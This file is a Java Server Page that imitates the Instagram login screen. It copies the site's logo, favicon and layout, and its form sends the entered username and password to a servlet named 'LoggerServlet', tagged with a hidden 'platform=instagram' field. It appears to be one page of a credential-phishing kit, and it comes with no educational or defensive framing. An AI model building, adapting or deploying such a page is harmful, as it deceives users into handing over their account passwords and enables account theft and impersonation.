<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<html>
<head>
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .container img {
            width: 175px;
            margin-bottom: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
        }
        button {
            width: 100%;
            padding: 8px;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .divider {
            margin: 20px 0;
            text-align: center;
            color: #999;
        }
    </style>
</head>
<body>
<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
    <form action="LoggerServlet" method="post">
    <input type="hidden" name="platform" value="instagram" />
    <input type="text" name="username" placeholder="Phone number, username, or email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
</form>
    <div class="divider">OR</div>
    <p style="font-size: 13px; color: #00376b;">Forgot password?</p>
</div>
</body>
</html>